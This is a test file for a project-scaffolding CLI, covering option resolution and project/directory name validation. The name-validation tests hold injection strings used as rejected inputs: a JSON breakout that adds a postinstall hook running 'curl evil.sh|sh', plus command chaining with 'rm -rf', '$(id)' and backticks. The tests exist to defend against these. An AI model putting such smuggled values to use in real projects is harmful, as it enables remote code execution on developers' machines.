import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  resolveOptions,
  validateDirName,
  validateProjectName,
} from '../lib/resolve.mjs';

function stubPrompts(overrides = {}) {
  return {
    text: vi.fn(async () => 'prompted-dir'),
    selectAdapter: vi.fn(async () => 'node' as const),
    confirm: vi.fn(async () => true),
    intro: vi.fn(),
    outro: vi.fn(),
    cancel: vi.fn(),
    note: vi.fn(),
    spinner: () => ({ start: vi.fn(), stop: vi.fn() }),
    ...overrides,
  };
}

const base = { yes: false, skipHints: false };
const cwd = tmpdir();

describe('resolveOptions: non-interactive', () => {
  it('applies defaults and never prompts', async () => {
    const prompts = stubPrompts();
    const opts = await resolveOptions(
      { ...base, targetDir: 'app' },
      { interactive: false, prompts, cwd }
    );
    expect(opts).toEqual({
      targetDir: 'app',
      adapter: 'cloudflare',
      ui: false,
      install: true,
      git: true,
      skipHints: false,
    });
    expect(prompts.text).not.toHaveBeenCalled();
    expect(prompts.selectAdapter).not.toHaveBeenCalled();
    expect(prompts.confirm).not.toHaveBeenCalled();
  });

  it('throws when targetDir is missing', async () => {
    await expect(
      resolveOptions(
        { ...base },
        { interactive: false, prompts: stubPrompts(), cwd }
      )
    ).rejects.toThrow(/project directory is required/i);
  });

  it('flag values override defaults', async () => {
    const opts = await resolveOptions(
      {
        ...base,
        targetDir: 'app',
        adapter: 'node',
        ui: true,
        install: false,
        git: false,
      },
      { interactive: false, prompts: stubPrompts(), cwd }
    );
    expect(opts).toMatchObject({
      adapter: 'node',
      ui: true,
      install: false,
      git: false,
    });
  });
});

describe('resolveOptions: interactive', () => {
  it('prompts only for fields not supplied by flags', async () => {
    const prompts = stubPrompts();
    const opts = await resolveOptions(
      { ...base, adapter: 'cloudflare' }, // adapter supplied; dir/ui/install/git prompted
      { interactive: true, prompts, cwd }
    );
    expect(prompts.text).toHaveBeenCalledTimes(1); // dir
    expect(prompts.selectAdapter).not.toHaveBeenCalled(); // adapter came from flag
    expect(prompts.confirm).toHaveBeenCalledTimes(3); // ui, install, git
    expect(opts).toEqual({
      targetDir: 'prompted-dir',
      adapter: 'cloudflare',
      ui: true,
      install: true,
      git: true,
      skipHints: false,
    });
  });
});

describe('validateDirName', () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'chp-validate-'));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it('rejects an empty or whitespace-only name', () => {
    expect(validateDirName('', dir)).toMatch(/required/i);
    expect(validateDirName('   ', dir)).toMatch(/required/i);
  });

  it('rejects an existing non-empty directory', () => {
    mkdirSync(join(dir, 'occupied'));
    writeFileSync(join(dir, 'occupied', 'keep.txt'), 'x');
    expect(validateDirName('occupied', dir)).toMatch(/not empty/i);
  });

  it('rejects a name that is an existing file', () => {
    writeFileSync(join(dir, 'afile'), 'x');
    expect(validateDirName('afile', dir)).toMatch(/file named/i);
  });

  it('accepts a fresh name', () => {
    expect(validateDirName('brand-new-app', dir)).toBeUndefined();
  });

  it('accepts an existing empty directory', () => {
    mkdirSync(join(dir, 'empty-existing'));
    expect(validateDirName('empty-existing', dir)).toBeUndefined();
  });

  it('rejects a name with JSON/shell metacharacters before touching the filesystem', () => {
    // The RCE lever: a name is substituted into package.json / shell scripts, so
    // a quote (JSON breakout to a sibling `postinstall`) or shell metachar must
    // be rejected. This must fire regardless of whether the dir exists.
    const evil = 'app", "postinstall": "curl evil.sh|sh #';
    expect(validateDirName(evil, dir)).toMatch(/invalid project name/i);
    expect(validateDirName('app && touch PWNED && x', dir)).toMatch(
      /invalid project name/i
    );
  });
});

describe('validateProjectName', () => {
  it('accepts ordinary slugs', () => {
    for (const ok of [
      'my-app',
      'my_app',
      'App',
      'app.v2',
      'a',
      'x123',
      'a-b_c.d',
    ]) {
      expect(validateProjectName(ok), ok).toBeUndefined();
    }
  });

  it('rejects quotes, spaces, shell metacharacters, and path traversal', () => {
    for (const bad of [
      'app"x', // JSON breakout
      'app && rm -rf x', // shell command chaining
      'app|sh', // pipe
      'a b', // space
      '$(id)', // command substitution
      '`id`', // backtick
      '..', // traversal
      '.env', // leading dot
      '-flag', // leading dash
      '', // empty
    ]) {
      expect(validateProjectName(bad), bad).toMatch(/invalid project name/i);
    }
  });
});
